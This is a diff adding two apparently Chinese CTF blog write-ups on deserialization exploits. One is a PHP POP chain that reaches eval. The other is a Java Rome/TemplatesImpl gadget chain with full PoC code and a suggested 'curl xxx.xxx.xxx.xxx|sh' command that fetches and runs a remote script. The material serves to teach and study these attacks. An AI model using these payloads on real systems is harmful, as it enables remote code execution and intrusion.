@@ -164,6 +164,263 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-php反序化（重复利用同一个类）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/03/28/php%E5%8F%8D%E5%BA%8F%E5%8C%96%EF%BC%88%E9%87%8D%E5%A4%8D%E5%88%A9%E7%94%A8%E5%90%8C%E4%B8%80%E4%B8%AA%E7%B1%BB%EF%BC%89/">php反序化（重复利用同一个类）</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2022/03/28/php%E5%8F%8D%E5%BA%8F%E5%8C%96%EF%BC%88%E9%87%8D%E5%A4%8D%E5%88%A9%E7%94%A8%E5%90%8C%E4%B8%80%E4%B8%AA%E7%B1%BB%EF%BC%89/" class="archive-article-date">
+  	<time datetime="2022-03-27T16:22:59.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-28</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>题目：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;waf.php&quot;;</span><br><span class="line">class NISA&#123;</span><br><span class="line">    public $fun&#x3D;&quot;show_me_flag&quot;;</span><br><span class="line">    public $txw4ever;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        if($this-&gt;fun&#x3D;&#x3D;&quot;show_me_flag&quot;)&#123;</span><br><span class="line">            hint();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __call($from,$val)&#123;</span><br><span class="line">        $this-&gt;fun&#x3D;$val[0];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;fun;</span><br><span class="line">        return &quot; &quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        checkcheck($this-&gt;txw4ever);</span><br><span class="line">        @eval($this-&gt;txw4ever);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class TianXiWei&#123;</span><br><span class="line">    public $ext;</span><br><span class="line">    public $x;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;ext-&gt;nisa($this-&gt;x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Ilovetxw&#123;</span><br><span class="line">    public $huang;</span><br><span class="line">    public $su;</span><br><span class="line"></span><br><span class="line">    public function __call($fun1,$arg)&#123;</span><br><span class="line">        $this-&gt;huang-&gt;fun&#x3D;$arg[0];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $bb &#x3D; $this-&gt;su;</span><br><span class="line">        return $bb();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class four&#123;</span><br><span class="line">    public $a&#x3D;&quot;TXW4EVER&quot;;</span><br><span class="line">    private $fun&#x3D;&#39;abc&#39;;</span><br><span class="line"></span><br><span class="line">    public function __set($name, $value)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;$name&#x3D;$value;</span><br><span class="line">        if ($this-&gt;fun &#x3D; &quot;sixsixsix&quot;)&#123;</span><br><span class="line">            strtolower($this-&gt;a);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;ser&#39;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#39;ser&#39;]);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;func checkcheck($data)&#123;</span><br><span class="line">&#x2F;&#x2F;  if(preg_match(......))&#123;</span><br><span class="line">&#x2F;&#x2F;      die(something wrong);</span><br><span class="line">&#x2F;&#x2F;  &#125;</span><br><span class="line">&#x2F;&#x2F;&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;function hint()&#123;</span><br><span class="line">&#x2F;&#x2F;    echo &quot;.......&quot;;</span><br><span class="line">&#x2F;&#x2F;    die();</span><br><span class="line">&#x2F;&#x2F;&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>利用链：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class TianXiWei:__wakeup&#123;$this-&gt;ext-&gt;nisa($this-&gt;x);--&gt;class Ilovetxw:__call($fun1,$arg)&#123;$this-&gt;huang-&gt;fun&#x3D;$arg[0];--&gt;class four:__set($name, $value)&#123;strtolower($this-&gt;a);--&gt;class Ilovetxw:__toString()&#123;return $bb();--&gt;class NISA:__invoke()&#123;eval($this-&gt;txw4ever);&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>因为要用两个Ilovetxw类，为了防止出现无线循环，可以分两个文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class four&#123;</span><br><span class="line">	public $a;</span><br><span class="line">    private $fun;</span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">            $this -&gt; a &#x3D; new Ilovetxw();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Ilovetxw&#123;</span><br><span class="line">	public $huang;</span><br><span class="line">    public $su;</span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">            $this -&gt; su &#x3D; new NISA();</span><br><span class="line">        &#125;        </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class NISA&#123;</span><br><span class="line">	public $fun;</span><br><span class="line">    public $txw4ever;</span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">            $this -&gt; txw4ever &#x3D; &quot;include(&#39;&#x2F;fllllllaaag&#39;);&quot;;</span><br><span class="line">        &#125;        </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ser&#x3D;new four();</span><br><span class="line">echo urlencode(serialize($ser));</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class TianXiWei&#123;</span><br><span class="line">    public $ext;</span><br><span class="line">    public $x;</span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">            $this -&gt; ext &#x3D; new Ilovetxw();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class Ilovetxw&#123;</span><br><span class="line">	public $huang;</span><br><span class="line">    public $su;</span><br><span class="line">        public function __construct() &#123;</span><br><span class="line">            $this -&gt; huang &#x3D; unserialize(urldecode(&quot;O%3A4%3A%22four%22%3A2%3A%7Bs%3A1%3A%22a%22%3BO%3A8%3A%22Ilovetxw%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BN%3Bs%3A2%3A%22su%22%3BO%3A4%3A%22NISA%22%3A2%3A%7Bs%3A3%3A%22fun%22%3BN%3Bs%3A8%3A%22txw4ever%22%3Bs%3A24%3A%22include%28%27%2Ffllllllaaag%27%29%3B%22%3B%7D%7Ds%3A9%3A%22%00four%00fun%22%3BN%3B%7D&quot;));</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">$ser&#x3D;new TianXiWei();</span><br><span class="line">echo urlencode(serialize($ser));</span><br></pre></td></tr></table></figure>
+<p>或者不用<code>__construct</code>赋值，而用<code>__invoke</code>带参,然后new两次，让两次new的内容不一样</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/03/28/php%E5%8F%8D%E5%BA%8F%E5%8C%96%EF%BC%88%E9%87%8D%E5%A4%8D%E5%88%A9%E7%94%A8%E5%90%8C%E4%B8%80%E4%B8%AA%E7%B1%BB%EF%BC%89/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
+    <article id="post-java反序化（CommonsBeanutils）笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/03/28/java%E5%8F%8D%E5%BA%8F%E5%8C%96%EF%BC%88CommonsBeanutils%EF%BC%89%E7%AC%94%E8%AE%B0/">java反序化（CommonsBeanutils）笔记</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2022/03/28/java%E5%8F%8D%E5%BA%8F%E5%8C%96%EF%BC%88CommonsBeanutils%EF%BC%89%E7%AC%94%E8%AE%B0/" class="archive-article-date">
+  	<time datetime="2022-03-27T16:16:14.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-28</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>这种反序化主要针对CommonsBeanutils的类型（如rome链等带有ToStringBean.java和TemplatesImpl.java文件的java反序列化），个人猜测大部分讲解几乎都来源于p神的这篇文章：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html">https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html</a><br>这里以d3ctf的题目和题解为例（其实几乎和p神发布的poc没什么很大的差别）<br>下载地址：<a target="_blank" rel="noopener" href="https://github.com/la0t0ng/d3ctf2022-shorter">https://github.com/la0t0ng/d3ctf2022-shorter</a></p>
+<p>poc主程序为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line">import com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line">import com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line">import org.example.asm.Resolver;</span><br><span class="line">import org.example.util.Generator;</span><br><span class="line">import org.example.util.SerializeUtil;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.File;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.Base64;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * Hello world!</span><br><span class="line"> *</span><br><span class="line"> *&#x2F;</span><br><span class="line">public class Main</span><br><span class="line">&#123;</span><br><span class="line">    public static byte[] resolveTemplatesPayload(String[] command) throws Exception &#123;</span><br><span class="line">        String path &#x3D; System.getProperty(&quot;user.dir&quot;) + File.separator + &quot;a.class&quot;;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;System.out.println(path);&#x2F;&#x2F;&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Generator.saveTemplateImpl(path, command);</span><br><span class="line">        Resolver.resolve(&quot;a.class&quot;);</span><br><span class="line">        byte[] newByteCodes &#x3D; Files.readAllBytes(Paths.get(&quot;a.class&quot;));</span><br><span class="line">        Files.delete(Paths.get(&quot;a.class&quot;));</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;        System.out.println(Base64.getEncoder().encodeToString(newByteCodes));</span><br><span class="line">        return newByteCodes;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main( String[] args ) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; sh -c &quot;curl xxx.xxx.xxx.xxx|sh&quot;</span><br><span class="line">        byte[] templatesbytes &#x3D; resolveTemplatesPayload(args);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;        System.out.println(templatesbytes);&#x2F;&#x2F;&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F;        System.out.println(new String(templatesbytes));&#x2F;&#x2F;&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F;        System.out.println(new byte[][]&#123;templatesbytes&#125;);&#x2F;&#x2F;&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F;        byte[][] a&#x3D;new byte[][]&#123;templatesbytes&#125;;&#x2F;&#x2F;&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F;        System.out.println(a[0]);&#x2F;&#x2F;&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F;        System.out.println(new String(a[0]));&#x2F;&#x2F;&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">        String rome &#x3D; rome(templatesbytes);</span><br><span class="line">        System.out.println(rome);</span><br><span class="line">        System.out.println(&quot;base64_length: &quot;+rome.length());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static String rome(byte[] templatesbytes) throws Exception &#123;</span><br><span class="line">        TemplatesImpl templates &#x3D; new TemplatesImpl();</span><br><span class="line">        SerializeUtil.setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;templatesbytes&#125;);</span><br><span class="line">        SerializeUtil.setFieldValue(templates,&quot;_name&quot;,&quot;a&quot;);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;templates.getClass().getName();</span><br><span class="line">        String result &#x3D; templates.getClass().getName();</span><br><span class="line">        String prefix &#x3D; result.substring(result.lastIndexOf(&quot;.&quot;) + 1);</span><br><span class="line">        System.out.println(prefix);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        ToStringBean toStringBean &#x3D; new ToStringBean(Templates.class, templates);</span><br><span class="line">        EqualsBean equalsBean &#x3D; new EqualsBean(ToStringBean.class, toStringBean);</span><br><span class="line"></span><br><span class="line">        ObjectBean objectBean &#x3D; new ObjectBean(String.class,&quot;a&quot;);</span><br><span class="line"></span><br><span class="line">        HashMap evilMap &#x3D; new HashMap();</span><br><span class="line">        evilMap.put(null,null);</span><br><span class="line">        evilMap.put(objectBean,null);</span><br><span class="line"></span><br><span class="line">        SerializeUtil.setFieldValue(objectBean,&quot;_equalsBean&quot;,equalsBean);</span><br><span class="line"></span><br><span class="line">        byte[] bytes &#x3D; SerializeUtil.serialize(evilMap);</span><br><span class="line">        return Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>下面将一步步解释：（图片在文字下面，建议分两个框，一个看图片，一个看介绍）<br>1.（图1红框）从main开始，接收了一个args传参，看提示<code> sh -c &quot;curl xxx.xxx.xxx.xxx|sh&quot;</code>说明可以直接传shell，追resolveTemplatesPayload方法<br>2.（图2绿框）resolveTemplatesPayload方法中把传入的args内容（command）和a.class这个文件名（这里可以System.out.println(path);看看内容），传入saveTemplateImpl(),追！<br>3.（图3蓝框）程序把我们传入的内容拼接成一个java的class。这里的ProcessBuilder类似于exec，是命令执行（可以随便传个参“clac”，然后System.out.println(code);看看内容）。<br>4.（图4黄框）回到刚刚的resolveTemplatesPayload方法，编译文件并用byte流的方式读取，然后删除文件，返回byte流（shell以java类的byte流的形式回到了main中）<br>5.（图5橙框）首先是可以通过<code>System.out.println(new String(templatesbytes));</code>的方式看一看刚才生成的byte流。追rome函数，开始反序列化。<br>在我的理解里，反序列化我们只有：改参数，或者说是为已有的参数赋值，以及调用（我们动不了方法（函数）的结构，也不可能增删类与方法）<br>所以用橙框括起来的那几个都是用来赋值的，包括new类时的传参，根据构造函数也会造成赋值，所以我们可以记一下，以后追链子的时候回来查就行：<br>TemplatesImpl类：<br>    _bytecodes=我们传入的比特流加一层数组（new byte[][]{templatesbytes}）<br>    _name=a<br>ObjectBean类：<br>    _equalsBean=EqualsBean类<br>    构造函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public ObjectBean(Class beanClass, Object obj, Set ignoreProperties) &#123;</span><br><span class="line">    this._equalsBean &#x3D; new EqualsBean(beanClass, obj);</span><br><span class="line">    this._toStringBean &#x3D; new ToStringBean(beanClass, obj);</span><br><span class="line">    this._cloneableBean &#x3D; new CloneableBean(obj, ignoreProperties);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code>main：```ObjectBean objectBean = new ObjectBean(String.class,&quot;a&quot;);```
+结果：
+\_equalsBean=String.class
+\_toStringBean=&quot;a&quot;
+</code></pre>
+<p>EqualsBean类：<br>    构造函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public EqualsBean(Class beanClass, Object obj) &#123;</span><br><span class="line">    if (!beanClass.isInstance(obj)) &#123;</span><br><span class="line">        throw new IllegalArgumentException(obj.getClass() + &quot; is not instance of &quot; + beanClass);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        this._beanClass &#x3D; beanClass;</span><br><span class="line">        this._obj &#x3D; obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code>main：```EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);```
+结果：
+\_beanClass=ToStringBean.class
+\_obj=toStringBean
+</code></pre>
+<p>ToStringBean类：<br>    构造函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public ToStringBean(Class beanClass, Object obj) &#123;</span><br><span class="line">    this._beanClass &#x3D; beanClass;</span><br><span class="line">    this._obj &#x3D; obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code>main：```ToStringBean toStringBean = new ToStringBean(Templates.class, templates);```
+结果：
+\_beanClass=Templates.class
+\_obj=templates
+</code></pre>
+<p>所以结果为（后续将以“由上可知”带过赋值过程）：<br>TemplatesImpl类：<br>    _bytecodes=我们传入的比特流加一层数组（new byte[][]{templatesbytes}）<br>    _name=a<br>ObjectBean类：<br>    _equalsBean=EqualsBean类<br>    _equalsBean=String.class<br>    _toStringBean=”a”<br>EqualsBean类：<br>    _beanClass=ToStringBean.class<br>    _obj=toStringBean<br>ToStringBean类：<br>    _beanClass=Templates.class<br>    _obj=templates</p>
+<p>这里可以用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">byte[][] a&#x3D;new byte[][]&#123;templatesbytes&#125;;</span><br><span class="line">System.out.println(new String(a[0]));</span><br></pre></td></tr></table></figure>
+<p>来验证一下_bytecodes[0]就是我们的恶意byte流</p>
+<p>6.整个利用链：<br>HashMap–&gt;ObjectBean–&gt;EqualsBean–&gt;ToStringBean–&gt;TemplatesImpl</p>
+<p>7.(图六绿框)<br>main的rome方法：<br>evilMap.put(objectBean,null);–&gt;put(K key, V value)(HashMap.java) (其中key为传入参数)</p>
+<p>HashMap.java的put方法<br>hash(key)–&gt;hash(Object key)(HashMap.java)</p>
+<p>HashMap.java的hash方法<br>hashCode()–&gt;hashCode()(ObjectBean.class)<br>(原因：main:<code>evilMap.put(objectBean,null);</code>)<br>由上可知_equalsBean=”a”<br>所以这里的<code>this._equalsBean.beanHashCode();</code>等同于<code>this.a.beanHashCode();</code><br>a.class就是我们的恶意代码，这里先需要实例化，即先需要运行<code>.beanHashCode()</code>然后才会运行<code>.a</code><br>（所以这里相当于分成两个链子：实例化和运行，这里先走实例化，等会还会回来</p>
+<p>ObjectBean.class的hashCode方法<br>beanHashCode()–&gt;beanHashCode()(EqualsBean.java）<br>（原因：main:<code>erializeUtil.setFieldValue(objectBean,&quot;_equalsBean&quot;,equalsBean);</code>）</p>
+<p>EqualsBean.java的beanHashCode方法<br>toString()–&gt;toString()(ToStringBean.class)<br>(原因：main:<code>EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);</code>)</p>
+<p>ToStringBean.class的toString（无参）方法<br>toString()–&gt;toString(prefix)(ToStringBean.class)<br>由上可知_obj=templates<br>所以<code>className = this._obj.getClass().getName();</code>的值为TemplatesImpl，也就是传参prefix的值<br>main中的代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;templates.getClass().getName();</span><br><span class="line">String result &#x3D; templates.getClass().getName();</span><br><span class="line">String prefix &#x3D; result.substring(result.lastIndexOf(&quot;.&quot;) + 1);</span><br><span class="line">System.out.println(prefix);</span><br></pre></td></tr></table></figure>
+<p>就是为了验证这个结果</p>
+<p>ToStringBean.class的toString（有参）方法：<br>printProperty(sb, prefix + “.” + pName, value)–&gt;printProperty(StringBuffer sb, String prefix, Object value)(ToStringBean.class)<br>由上可知_beanClass=Templates.class<br>这里显示逐渐把prefix的参数传给sb，然后退回toString(String prefix)方法，这里会运行TemplatesImpl的所有get方法，当然也就包括getOutputProperties()方法<br>(保留)</p>
+<p>然后直接追到TemplatesImpl的getOutputProperties()方法：<br>getOutputProperties()–&gt;newTransformer()–&gt;getTransletInstance()(由上可知，这里的_name已经被赋值为a，所以不会提前return)–&gt;defineTransletClasses()<br>defineTransletClasses()方法：_bytecodes一开始被我们定义成恶意类的比特流，这里进行了实例化<br>然后这条线走完了</p>
+<p>接着回到hashCode()–&gt;hashCode()(ObjectBean.class)那一步：<br>“.a”直接运行代码a.class的内容，实现shell</p>
+<img src="/2022/03/28/java%E5%8F%8D%E5%BA%8F%E5%8C%96%EF%BC%88CommonsBeanutils%EF%BC%89%E7%AC%94%E8%AE%B0/1.png" class="" title="1.png">
+<p>图一</p>
+<img src="/2022/03/28/java%E5%8F%8D%E5%BA%8F%E5%8C%96%EF%BC%88CommonsBeanutils%EF%BC%89%E7%AC%94%E8%AE%B0/2.png" class="" title="2.png">
+<p>图二</p>
+<img src="/2022/03/28/java%E5%8F%8D%E5%BA%8F%E5%8C%96%EF%BC%88CommonsBeanutils%EF%BC%89%E7%AC%94%E8%AE%B0/3.png" class="" title="3.png">
+<p>图三</p>
+<img src="/2022/03/28/java%E5%8F%8D%E5%BA%8F%E5%8C%96%EF%BC%88CommonsBeanutils%EF%BC%89%E7%AC%94%E8%AE%B0/4.png" class="" title="4.png">
+<p>图四</p>
+<img src="/2022/03/28/java%E5%8F%8D%E5%BA%8F%E5%8C%96%EF%BC%88CommonsBeanutils%EF%BC%89%E7%AC%94%E8%AE%B0/5.png" class="" title="5.png">
+<p>图五</p>
+<img src="/2022/03/28/java%E5%8F%8D%E5%BA%8F%E5%8C%96%EF%BC%88CommonsBeanutils%EF%BC%89%E7%AC%94%E8%AE%B0/6.png" class="" title="6.png">
+<p>图六</p>
+<img src="/2022/03/28/java%E5%8F%8D%E5%BA%8F%E5%8C%96%EF%BC%88CommonsBeanutils%EF%BC%89%E7%AC%94%E8%AE%B0/7.png" class="" title="7.png">
+<p>图七</p>
+<img src="/2022/03/28/java%E5%8F%8D%E5%BA%8F%E5%8C%96%EF%BC%88CommonsBeanutils%EF%BC%89%E7%AC%94%E8%AE%B0/8.png" class="" title="8.png">
+<p>图八</p>
